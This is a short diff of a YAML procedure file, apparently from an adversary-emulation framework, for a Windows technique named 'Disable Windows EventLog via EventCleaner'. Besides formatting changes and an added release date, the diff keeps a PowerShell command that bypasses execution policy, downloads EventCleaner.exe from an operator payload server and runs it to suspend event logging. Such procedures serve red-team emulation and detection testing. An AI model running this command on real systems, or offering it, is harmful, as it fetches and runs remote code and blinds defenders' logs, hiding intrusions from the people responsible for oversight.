@@ -2,9 +2,10 @@ id: 8feb27ce-63db-472f-b8e9-038134e9d79a
 metadata:
   version: 1
   authors:
-    - Archie Pocsedio
-  tags: 
-    - destructive
+  - Archie Pocsedio
+  tags:
+  - destructive
+  release_date: 2021-08-25
 name: Disable Windows EventLog via EventCleaner
 description: |
   This procedure will stop eventlog using EventCleaner tools.
@@ -15,5 +16,6 @@ technique:
 platforms:
   windows:
     cmd:
-      command: powershell.exe -exec bypass -C "(New-Object Net.WebClient).DownloadFile('#{operator.payloads}/defense-evasion/generic/EventCleaner.exe','EventCleaner.exe')";.\EventCleaner.exe suspend
-    
+      command: powershell.exe -exec bypass -C "(New-Object Net.WebClient).DownloadFile('#{operator.payloads}/defense-evasion/generic/EventCleaner.exe','EventCleaner.exe')";.\EventCleaner.exe
+        suspend
+
